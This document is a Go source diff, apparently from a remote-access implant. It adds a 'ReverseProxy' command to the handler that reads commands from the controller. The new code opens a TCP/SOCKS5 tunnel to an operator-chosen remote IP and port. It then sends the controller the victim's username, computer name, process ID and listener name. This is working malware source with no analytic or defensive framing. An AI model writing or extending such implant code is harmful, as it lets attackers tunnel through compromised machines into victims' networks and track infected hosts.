@@ -6,6 +6,7 @@ import (
 	"io/ioutil"
 
 	"main/Encrypt"
+	"main/Helper/Proxy/operate"
 	"main/MessagePack"
 	"main/PcInfo"
 	"main/TCPsocket"
@@ -530,7 +531,36 @@ func Read(Data []byte, Connection net.Conn) {
 			m <- []byte(strings.Replace(unmsgpack.ForcePathObject("Command").GetAsString(), "\r\n", "", -1) + "\n")
 			return
 		}
+	case "ReverseProxy":
+		{
+			RemoteIp := unmsgpack.ForcePathObject("remoteIp").GetAsString()
+			connectPort := unmsgpack.ForcePathObject("connectPort").GetAsString()
+			go func() {
+
+				//fmt.Println(RemoteIp + ":" + connectPort)
+				operate.ProxyRemote(RemoteIp+":"+connectPort, false)
+			}()
+			//fmt.Println(unmsgpack.ForcePathObject("HPID").GetAsString())
+			msgpack := new(MessagePack.MsgPack)
+
+			msgpack.ForcePathObject("Pac_ket").SetAsString("ProxyInfo")
+
+			info := PcInfo.GetCurrentUser() + "-=>" +
+				PcInfo.ClientComputer + "-=>" +
+				PcInfo.GetProcessID() + "-=>" +
+				"TCP/Socks5" + "-=>" +
+				RemoteIp + "-=>" +
+				connectPort + "-=>" +
+				unmsgpack.ForcePathObject("HPID").GetAsString() + "-=>" +
+				unmsgpack.ForcePathObject("SocksPort").GetAsString() + "-=>"
+
+			msgpack.ForcePathObject("Info").SetAsString(info)
+			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
+			TCPsocket.Send(Connection, msgpack.Encode2Bytes())
+		}
+
 	}
+
 }
 
 func deleteStringFromFile(filePath, strToDelete string) error {
